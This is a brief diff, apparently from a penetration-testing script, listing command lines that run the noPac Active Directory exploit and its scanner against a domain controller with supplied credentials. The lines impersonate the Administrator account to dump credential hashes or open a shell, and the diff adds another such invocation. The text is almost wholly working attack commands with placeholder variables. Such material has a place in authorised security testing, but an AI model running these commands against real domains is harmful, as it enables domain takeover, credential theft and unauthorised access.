@@ -2,3 +2,4 @@
 python3 scanner.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
 python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
 python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -shell
+noPac.py "$DOMAIN"/"$USER":"$PASSWORD" -dc-ip "$DC_IP" --impersonate "Administrator"
